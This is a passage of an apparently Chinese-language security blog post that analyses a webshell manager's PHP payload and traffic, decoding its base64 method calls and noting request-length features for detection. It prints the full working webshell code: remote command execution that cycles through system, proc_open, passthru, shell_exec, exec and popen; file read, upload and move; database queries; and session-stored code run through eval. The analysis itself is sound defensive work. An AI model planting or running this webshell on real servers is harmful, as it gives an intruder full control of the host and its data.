&#125;else&#123;</span><br><span class="line">        return &quot;The target does not exist or is not a file&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function moveFile()&#123;</span><br><span class="line">    $srcFileName=get(&quot;srcFileName&quot;);</span><br><span class="line">    $destFileName=get(&quot;destFileName&quot;);</span><br><span class="line">    if (rename($srcFileName,$destFileName))&#123;</span><br><span class="line">        return &quot;ok&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function getBasicsInfo()</span><br><span class="line">&#123;</span><br><span class="line">    $data = array();</span><br><span class="line">    $data[&apos;OsInfo&apos;] = @php_uname();</span><br><span class="line">    $data[&apos;CurrentUser&apos;] = @get_current_user();</span><br><span class="line">    $data[&apos;CurrentUser&apos;] = strlen(trim($data[&apos;CurrentUser&apos;])) &gt; 0 ? $data[&apos;CurrentUser&apos;] : &apos;NULL&apos;;</span><br><span class="line">    $data[&apos;disable_functions&apos;] = (@ini_get(&apos;disable_functions&apos;));</span><br><span class="line">    $data[&apos;disable_functions&apos;] = strlen(trim($data[&apos;disable_functions&apos;])) &gt; 0 ? $data[&apos;disable_functions&apos;] : @get_cfg_var(&apos;disable_functions&apos;);</span><br><span class="line">    $data[&apos;timezone&apos;] = @ini_get(&apos;date.timezone&apos;);</span><br><span class="line">    $data[&apos;encode&apos;] = @ini_get(&apos;exif.encode_unicode&apos;);</span><br><span class="line">    $data[&apos;extension_dir&apos;] = @ini_get(&apos;extension_dir&apos;);</span><br><span class="line">    $data[&apos;include_path&apos;] = @ini_get(&apos;include_path&apos;);</span><br><span class="line">    $data[&apos;PHP_SAPI&apos;] = PHP_SAPI;</span><br><span class="line">    $data[&apos;PHP_VERSION&apos;] = PHP_VERSION;</span><br><span class="line">    $data[&apos;memory_limit&apos;] = ini_get(&apos;memory_limit&apos;);</span><br><span class="line">    $data[&apos;upload_max_filesize&apos;] = ini_get(&apos;upload_max_filesize&apos;);</span><br><span class="line">    $data[&apos;post_max_size&apos;] = ini_get(&apos;post_max_size&apos;);</span><br><span class="line">    $data[&apos;max_execution_time&apos;] = ini_get(&apos;max_execution_time&apos;);</span><br><span class="line">    $data[&apos;max_input_time&apos;] = ini_get(&apos;max_input_time&apos;);</span><br><span class="line">    $data[&apos;default_socket_timeout&apos;] = ini_get(&apos;default_socket_timeout&apos;);</span><br><span class="line">    $data[&apos;mygid&apos;] = @getmygid();</span><br><span class="line">    $data[&apos;mypid&apos;] = @getmypid();</span><br><span class="line">    $data[&apos;SERVER_SOFTWAREypid&apos;] = @$_SERVER[&apos;SERVER_SOFTWARE&apos;];</span><br><span class="line">    $data[&apos;SERVER_PORT&apos;] = @$_SERVER[&apos;SERVER_PORT&apos;];</span><br><span class="line">    $data[&apos;loaded_extensions&apos;] = @implode(&apos;,&apos;, @get_loaded_extensions());</span><br><span class="line">    $data[&apos;short_open_tag&apos;] = @get_cfg_var(&apos;short_open_tag&apos;);</span><br><span class="line">    $data[&apos;short_open_tag&apos;] = @(int)$data[&apos;short_open_tag&apos;] == 1 ? &apos;true&apos; : &apos;false&apos;;</span><br><span class="line">    $data[&apos;asp_tags&apos;] = @get_cfg_var(&apos;asp_tags&apos;);</span><br><span class="line">    $data[&apos;asp_tags&apos;] = (int)$data[&apos;asp_tags&apos;] == 1 ? &apos;true&apos; : &apos;false&apos;;</span><br><span class="line">    $data[&apos;safe_mode&apos;] = @get_cfg_var(&apos;safe_mode&apos;);</span><br><span class="line">    $data[&apos;safe_mode&apos;] = (int)$data[&apos;safe_mode&apos;] == 1 ? &apos;true&apos; : &apos;false&apos;;</span><br><span class="line">    $data[&apos;CurrentDir&apos;] = str_replace(&apos;\\&apos;, &apos;/&apos;, @dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;]));</span><br><span class="line">    $data[&apos;FileRoot&apos;] = &apos;&apos;;</span><br><span class="line">    if (substr(__FILE__, 0, 1) != &apos;/&apos;) &#123;foreach (range(&apos;A&apos;, &apos;Z&apos;) as $L)&#123; if (@is_dir(&quot;&#123;$L&#125;:&quot;))&#123; $data[&apos;FileRoot&apos;] .= &quot;&#123;$L&#125;:/;&quot;;&#125;&#125;;&#125;;</span><br><span class="line">    $data[&apos;FileRoot&apos;] = (strlen(trim($data[&apos;FileRoot&apos;])) &gt; 0 ? $data[&apos;FileRoot&apos;] : &apos;/&apos;);</span><br><span class="line">    $data[&apos;FileRoot&apos;]= substr_count($data[&apos;FileRoot&apos;],substr(__FILE__, 0, 1))&lt;=0?substr(__FILE__, 0, 1).&quot;:/&quot;:$data[&apos;FileRoot&apos;];</span><br><span class="line">    $result=&quot;&quot;;</span><br><span class="line">    foreach($data as $key=&gt;$value)&#123;</span><br><span class="line">        $result.=$key.&quot; : &quot;.$value.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line">function getFile()&#123;</span><br><span class="line">    $dir=get(&apos;dirName&apos;);</span><br><span class="line">    $dir=(strlen(@trim($dir))&gt;0)?trim($dir):str_replace(&apos;\\&apos;,&apos;/&apos;,dirname(__FILE__));</span><br><span class="line">    $dir.=&quot;/&quot;;</span><br><span class="line">    $path=$dir;</span><br><span class="line">    $allFiles = @scandir($path);</span><br><span class="line">    $data=&quot;&quot;;</span><br><span class="line">    if ($allFiles!=null)&#123;</span><br><span class="line">        $data.=&quot;ok&quot;;</span><br><span class="line">        $data.=&quot;\n&quot;;</span><br><span class="line">        $data.=$path;</span><br><span class="line">        $data.=&quot;\n&quot;;</span><br><span class="line">        foreach ($allFiles as $fileName) &#123;</span><br><span class="line">            if ($fileName!=&quot;.&quot;&amp;&amp;$fileName!=&quot;..&quot;)&#123;</span><br><span class="line">                $fullPath = $path.$fileName;</span><br><span class="line">                $lineData=array();</span><br><span class="line">                array_push($lineData,$fileName);</span><br><span class="line">                array_push($lineData,@is_file($fullPath)?&quot;1&quot;:&quot;0&quot;);</span><br><span class="line">                array_push($lineData,date(&quot;Y-m-d H:i:s&quot;, @filemtime($fullPath)));</span><br><span class="line">                array_push($lineData,@filesize($fullPath));</span><br><span class="line">                $fr=(@is_readable($fullPath)?&quot;R&quot;:&quot;&quot;).(@is_writable($fullPath)?&quot;W&quot;:&quot;&quot;).(@is_executable($fullPath)?&quot;X&quot;:&quot;&quot;);</span><br><span class="line">                array_push($lineData,(strlen($fr)&gt;0?$fr:&quot;F&quot;));</span><br><span class="line">                $data.=(implode(&quot;\t&quot;,$lineData).&quot;\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return &quot;Path Not Found Or No Permission!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line">function readFileContent()&#123;</span><br><span class="line">    $fileName=get(&quot;fileName&quot;);</span><br><span class="line">    if (@is_file($fileName))&#123;</span><br><span class="line">        if (@is_readable($fileName))&#123;</span><br><span class="line">            return file_get_contents($fileName);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return &quot;No Permission!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return &quot;File Not Found&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function uploadFile()&#123;</span><br><span class="line">    $fileName=get(&quot;fileName&quot;);</span><br><span class="line">    $fileValue=get(&quot;fileValue&quot;);</span><br><span class="line">    if (@file_put_contents($fileName,$fileValue)!==false)&#123;</span><br><span class="line">        return &quot;ok&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function newDir()&#123;</span><br><span class="line">    $dir=get(&quot;dirName&quot;);</span><br><span class="line">    if (@mkdir($dir,0777,true)!==false)&#123;</span><br><span class="line">        return &quot;ok&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function newFile()&#123;</span><br><span class="line">    $fileName=get(&quot;fileName&quot;);</span><br><span class="line">    if (@file_put_contents($fileName,&quot;&quot;)!==false)&#123;</span><br><span class="line">        return &quot;ok&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function execCommand()&#123;</span><br><span class="line">    $result = &quot;&quot;;</span><br><span class="line">    $command = get(&quot;cmdLine&quot;);</span><br><span class="line">    $PadtJn = @ini_get(&apos;disable_functions&apos;);</span><br><span class="line">    if (! empty($PadtJn)) &#123;</span><br><span class="line">        $PadtJn = preg_replace(&apos;/[, ]+/&apos;, &apos;,&apos;, $PadtJn);</span><br><span class="line">        $PadtJn = explode(&apos;,&apos;, $PadtJn);</span><br><span class="line">        $PadtJn = array_map(&apos;trim&apos;, $PadtJn);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $PadtJn = array();</span><br><span class="line">    &#125;</span><br><span class="line">    if (FALSE !== strpos(strtolower(PHP_OS), &apos;win&apos;)) &#123;</span><br><span class="line">        $command = $command . &quot; 2&gt;&amp;1\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (is_callable(&apos;system&apos;) and ! in_array(&apos;system&apos;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        system($command);</span><br><span class="line">        $result = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if (is_callable(&apos;proc_open&apos;) and ! in_array(&apos;proc_open&apos;, $PadtJn)) &#123;</span><br><span class="line">        $handle = proc_open($command, array(array(&apos;pipe&apos;,&apos;r&apos;),array(&apos;pipe&apos;,&apos;w&apos;),array(&apos;pipe&apos;,&apos;w&apos;)),$pipes);</span><br><span class="line">        $result = NULL;</span><br><span class="line">        while (! feof($pipes[1])) &#123;</span><br><span class="line">            $result .= fread($pipes[1], 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        @proc_close($handle);</span><br><span class="line">    &#125; else if (is_callable(&apos;passthru&apos;) and ! in_array(&apos;passthru&apos;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru($command);</span><br><span class="line">        $result = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if (is_callable(&apos;shell_exec&apos;) and ! in_array(&apos;shell_exec&apos;, $PadtJn)) &#123;</span><br><span class="line">        $result = shell_exec($command);</span><br><span class="line">    &#125; else if (is_callable(&apos;exec&apos;) and ! in_array(&apos;exec&apos;, $PadtJn)) &#123;</span><br><span class="line">        $result = array();</span><br><span class="line">        exec($command, $result);</span><br><span class="line">        $result = join(chr(10), $result) . chr(10);</span><br><span class="line">    &#125; else if (is_callable(&apos;exec&apos;) and ! in_array(&apos;popen&apos;, $PadtJn)) &#123;</span><br><span class="line">        $fp = popen($command, &apos;r&apos;);</span><br><span class="line">        $result = NULL;</span><br><span class="line">        if (is_resource($fp)) &#123;</span><br><span class="line">            while (! feof($fp)) &#123;</span><br><span class="line">                $result .= fread($fp, 1024);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @pclose($fp);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return &quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line">function execSql()&#123;</span><br><span class="line">    $dbType=get(&quot;dbType&quot;);</span><br><span class="line">    $dbHost=get(&quot;dbHost&quot;);</span><br><span class="line">    $dbPort=get(&quot;dbPort&quot;);</span><br><span class="line">    $username=get(&quot;dbUsername&quot;);</span><br><span class="line">    $password=get(&quot;dbPassword&quot;);</span><br><span class="line">    $execType=get(&quot;execType&quot;);</span><br><span class="line">    $execSql=get(&quot;execSql&quot;);</span><br><span class="line">    function  mysql_exec($host,$port,$username,$password,$execType,$sql)&#123;</span><br><span class="line">        // 创建连接</span><br><span class="line">        $conn = new mysqli($host,$username,$password,&quot;&quot;,$port);</span><br><span class="line">        // Check connection</span><br><span class="line">        if ($conn-&gt;connect_error) &#123;</span><br><span class="line">            return $conn-&gt;connect_error;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        if ($conn-&gt;error)&#123;</span><br><span class="line">            return $conn-&gt;error;</span><br><span class="line">        &#125;</span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        if ($execType==&quot;update&quot;)&#123;</span><br><span class="line">            return &quot;Query OK, &quot;+$conn-&gt;affected_rows+&quot; rows affected&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $data=&quot;ok\n&quot;;</span><br><span class="line">            while ($column = $result-&gt;fetch_field())&#123;</span><br><span class="line">                $data.=base64_encode($column-&gt;name).&quot;\t&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            $data.=&quot;\n&quot;;</span><br><span class="line">            if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">                // 输出数据</span><br><span class="line">                while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                    foreach ($row as $value)&#123;</span><br><span class="line">                        $data.=base64_encode($value).&quot;\t&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $data.=&quot;\n&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return $data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function pdoExec($databaseType,$host,$port,$username,$password,$execType,$sql)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            $conn = new PDO(&quot;&#123;$databaseType&#125;:host=$host;port=&#123;$port&#125;;&quot;, $username, $password);</span><br><span class="line"></span><br><span class="line">            // 设置 PDO 错误模式为异常</span><br><span class="line">            $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><br><span class="line"></span><br><span class="line">            if ($execType==&quot;update&quot;)&#123;</span><br><span class="line">                return &quot;Query OK, &quot;+$conn-&gt;exec($sql)+&quot; rows affected&quot;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $data=&quot;ok\n&quot;;</span><br><span class="line">                $stm=$conn-&gt;prepare($sql);</span><br><span class="line">                $stm-&gt;execute();</span><br><span class="line">                $row=$stm-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">                $_row=&quot;\n&quot;;</span><br><span class="line">                foreach (array_keys($row) as $key)&#123;</span><br><span class="line">                    $data.=base64_encode($key).&quot;\t&quot;;</span><br><span class="line">                    $_row.=base64_encode($row[$key]).&quot;\t&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                $data.=$_row.&quot;\n&quot;;</span><br><span class="line">                while ($row=$stm-&gt;fetch(PDO::FETCH_ASSOC))&#123;</span><br><span class="line">                    foreach (array_keys($row) as $key)&#123;</span><br><span class="line">                        $data.=base64_encode($row[$key]).&quot;\t&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $data.=&quot;\n&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                return $data;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        catch(PDOException $e)</span><br><span class="line">        &#123;</span><br><span class="line">            return $e-&gt;getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($dbType==&quot;mysql&quot;)&#123;</span><br><span class="line">        if (extension_loaded(&quot;mysqli&quot;))&#123;</span><br><span class="line">            return mysql_exec($dbHost,$dbPort,$username,$password,$execType,$execSql);</span><br><span class="line">        &#125;else if (extension_loaded(&quot;pdo&quot;))&#123;</span><br><span class="line">            return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return &quot;no extension&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else if (extension_loaded(&quot;pdo&quot;))&#123;</span><br><span class="line">        return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return &quot;no extension&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;no extension&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function base64Encode($data)&#123;</span><br><span class="line">    return base64_encode($data);</span><br><span class="line">&#125;</span><br><span class="line">function test()&#123;</span><br><span class="line">    return &quot;ok&quot;;</span><br><span class="line">&#125;</span><br><span class="line">function get($key)&#123;</span><br><span class="line">    global $parameters;</span><br><span class="line">    if (isset($parameters[$key]))&#123;</span><br><span class="line">        return $parameters[$key];</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function includeCode()&#123;</span><br><span class="line">    @session_start();</span><br><span class="line">    $classCode=get(&quot;binCode&quot;);</span><br><span class="line">    $codeName=get(&quot;codeName&quot;);</span><br><span class="line">    $_SESSION[$codeName]=$classCode;</span><br><span class="line">    @session_write_close();</span><br><span class="line">    return &quot;ok&quot;;</span><br><span class="line">&#125;</span><br><span class="line">function base64Decode($string)&#123;</span><br><span class="line">    return base64_decode($string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们单独把evalFunc拿出来看看，就是通过获取参数methodName的值，之后一般都是走调用$methodName()的路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function evalFunc()&#123;</span><br><span class="line">    @session_write_close();</span><br><span class="line">    $className=get(&quot;codeName&quot;);</span><br><span class="line">    $methodName=get(&quot;methodName&quot;);</span><br><span class="line">    if ($methodName!=null)&#123;</span><br><span class="line">        if (strlen(trim($className))&gt;0)&#123;</span><br><span class="line">            if ($methodName==&quot;includeCode&quot;)&#123;</span><br><span class="line">                return includeCode();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                if (isset($_SESSION[$className]))&#123;</span><br><span class="line">                    return eval($_SESSION[$className]);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    return &quot;&#123;$className&#125; no load&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return $methodName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return &quot;methodName Is Null&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二次调用test函数"><a href="#第二次调用test函数" class="headerlink" title="第二次调用test函数"></a>第二次调用test函数</h3><p>服务端收到的解密结果是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">methodName=dGVzdA==</span><br></pre></td></tr></table></figure>
+
+<p>我们base64解码一下参数的值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">methodName=test</span><br></pre></td></tr></table></figure>
+
+<p>所以是调用上面的test函数，就是直接返回ok而已</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function test()&#123;</span><br><span class="line">    return &quot;ok&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第三次获取基本信息"><a href="#第三次获取基本信息" class="headerlink" title="第三次获取基本信息"></a>第三次获取基本信息</h3><p>服务端收到的解密结果是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">methodName=Z2V0QmFzaWNzSW5mbw==</span><br></pre></td></tr></table></figure>
+
+<p>我们base64解码一下参数的值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">methodName=getBasicsInfo</span><br></pre></td></tr></table></figure>
+
+<p>就是调用getBasicsInfo函数，那就是我们进入webshell后看到的服务器的一些基础信息了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">function getBasicsInfo()</span><br><span class="line">&#123;</span><br><span class="line">    $data = array();</span><br><span class="line">    $data[&apos;OsInfo&apos;] = @php_uname();</span><br><span class="line">    $data[&apos;CurrentUser&apos;] = @get_current_user();</span><br><span class="line">    $data[&apos;CurrentUser&apos;] = strlen(trim($data[&apos;CurrentUser&apos;])) &gt; 0 ? $data[&apos;CurrentUser&apos;] : &apos;NULL&apos;;</span><br><span class="line">    $data[&apos;disable_functions&apos;] = (@ini_get(&apos;disable_functions&apos;));</span><br><span class="line">    $data[&apos;disable_functions&apos;] = strlen(trim($data[&apos;disable_functions&apos;])) &gt; 0 ? $data[&apos;disable_functions&apos;] : @get_cfg_var(&apos;disable_functions&apos;);</span><br><span class="line">    $data[&apos;timezone&apos;] = @ini_get(&apos;date.timezone&apos;);</span><br><span class="line">    $data[&apos;encode&apos;] = @ini_get(&apos;exif.encode_unicode&apos;);</span><br><span class="line">    $data[&apos;extension_dir&apos;] = @ini_get(&apos;extension_dir&apos;);</span><br><span class="line">    $data[&apos;include_path&apos;] = @ini_get(&apos;include_path&apos;);</span><br><span class="line">    $data[&apos;PHP_SAPI&apos;] = PHP_SAPI;</span><br><span class="line">    $data[&apos;PHP_VERSION&apos;] = PHP_VERSION;</span><br><span class="line">    $data[&apos;memory_limit&apos;] = ini_get(&apos;memory_limit&apos;);</span><br><span class="line">    $data[&apos;upload_max_filesize&apos;] = ini_get(&apos;upload_max_filesize&apos;);</span><br><span class="line">    $data[&apos;post_max_size&apos;] = ini_get(&apos;post_max_size&apos;);</span><br><span class="line">    $data[&apos;max_execution_time&apos;] = ini_get(&apos;max_execution_time&apos;);</span><br><span class="line">    $data[&apos;max_input_time&apos;] = ini_get(&apos;max_input_time&apos;);</span><br><span class="line">    $data[&apos;default_socket_timeout&apos;] = ini_get(&apos;default_socket_timeout&apos;);</span><br><span class="line">    $data[&apos;mygid&apos;] = @getmygid();</span><br><span class="line">    $data[&apos;mypid&apos;] = @getmypid();</span><br><span class="line">    $data[&apos;SERVER_SOFTWAREypid&apos;] = @$_SERVER[&apos;SERVER_SOFTWARE&apos;];</span><br><span class="line">    $data[&apos;SERVER_PORT&apos;] = @$_SERVER[&apos;SERVER_PORT&apos;];</span><br><span class="line">    $data[&apos;loaded_extensions&apos;] = @implode(&apos;,&apos;, @get_loaded_extensions());</span><br><span class="line">    $data[&apos;short_open_tag&apos;] = @get_cfg_var(&apos;short_open_tag&apos;);</span><br><span class="line">    $data[&apos;short_open_tag&apos;] = @(int)$data[&apos;short_open_tag&apos;] == 1 ? &apos;true&apos; : &apos;false&apos;;</span><br><span class="line">    $data[&apos;asp_tags&apos;] = @get_cfg_var(&apos;asp_tags&apos;);</span><br><span class="line">    $data[&apos;asp_tags&apos;] = (int)$data[&apos;asp_tags&apos;] == 1 ? &apos;true&apos; : &apos;false&apos;;</span><br><span class="line">    $data[&apos;safe_mode&apos;] = @get_cfg_var(&apos;safe_mode&apos;);</span><br><span class="line">    $data[&apos;safe_mode&apos;] = (int)$data[&apos;safe_mode&apos;] == 1 ? &apos;true&apos; : &apos;false&apos;;</span><br><span class="line">    $data[&apos;CurrentDir&apos;] = str_replace(&apos;\\&apos;, &apos;/&apos;, @dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;]));</span><br><span class="line">    $data[&apos;FileRoot&apos;] = &apos;&apos;;</span><br><span class="line">    if (substr(__FILE__, 0, 1) != &apos;/&apos;) &#123;foreach (range(&apos;A&apos;, &apos;Z&apos;) as $L)&#123; if (@is_dir(&quot;&#123;$L&#125;:&quot;))&#123; $data[&apos;FileRoot&apos;] .= &quot;&#123;$L&#125;:/;&quot;;&#125;&#125;;&#125;;</span><br><span class="line">    $data[&apos;FileRoot&apos;] = (strlen(trim($data[&apos;FileRoot&apos;])) &gt; 0 ? $data[&apos;FileRoot&apos;] : &apos;/&apos;);</span><br><span class="line">    $data[&apos;FileRoot&apos;]= substr_count($data[&apos;FileRoot&apos;],substr(__FILE__, 0, 1))&lt;=0?substr(__FILE__, 0, 1).&quot;:/&quot;:$data[&apos;FileRoot&apos;];</span><br><span class="line">    $result=&quot;&quot;;</span><br><span class="line">    foreach($data as $key=&gt;$value)&#123;</span><br><span class="line">        $result.=$key.&quot; : &quot;.$value.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来说特征，由于有url编码，导致第一次长度变化很大</p>
+<p><img src="http://pic.giantbranch.cn/pic/1598947912468.png" alt></p>
+<p>假如防护设备默认url解码的话，=号后面的base64字符长度是23068，但返回的长度是0，也是非常重要的特征</p>
+<p>第一次长度变化很多我们可以检查第二次啊</p>
+<p><img src="http://pic.giantbranch.cn/pic/1599040561600.png" alt></p>
+<p>第二次也是由于url编码导致请求变化，有url解码的话，=号后面的base64字符长度是40，返回包应该不会出现url编码，长度是40</p>
+<p>header由于可以自定义，我们就不关注了，通过逆向看源码是从本地数据库读取的，就是用户设置存储到本地的</p>
+<p>下面是通过通过JDGUI反编译得到的源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">private static void initHttpHeader() &#123;</span><br><span class="line">    String headerString = getGloballHttpHeader();</span><br><span class="line">    if (headerString != null) &#123;</span><br><span class="line">      String[] reqLines = headerString.split(&quot;\n&quot;);</span><br><span class="line">      headerMap = new Hashtable&lt;&gt;();</span><br><span class="line">      for (int i = 0; i &lt; reqLines.length; i++) &#123;</span><br><span class="line">        if (!reqLines[i].trim().isEmpty()) &#123;</span><br><span class="line">          int index = reqLines[i].indexOf(&quot;:&quot;);</span><br><span class="line">          if (index &gt; 1) &#123;</span><br><span class="line">            String keyName = reqLines[i].substring(0, index).trim();</span><br><span class="line">            String keyValue = reqLines[i].substring(index + 1, reqLines[i].length()).trim();</span><br><span class="line">            headerMap.put(keyName, keyValue);</span><br><span class="line">          &#125; </span><br><span class="line">        &#125; </span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  public static String getGloballHttpHeader() &#123;</span><br><span class="line">    return Db.getSetingValue(&quot;globallHttpHeader&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">    public static String getSetingValue(String key) &#123;</span><br><span class="line">    String getSetingValueSql = &quot;SELECT value FROM seting WHERE key=?&quot;;</span><br><span class="line">    try &#123;</span><br><span class="line">      PreparedStatement preparedStatement = getPreparedStatement(getSetingValueSql);</span><br><span class="line">      preparedStatement.setString(1, key);</span><br><span class="line">      ResultSet resultSet = preparedStatement.executeQuery();</span><br><span class="line">      String value = resultSet.next() ? resultSet.getString(&quot;value&quot;) : null;</span><br><span class="line">      resultSet.close();</span><br><span class="line">      preparedStatement.close();</span><br><span class="line">      return value;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">      Log.error(e);</span><br><span class="line">      return null;</span><br><span class="line">    &#125; </span><br><span class="line">  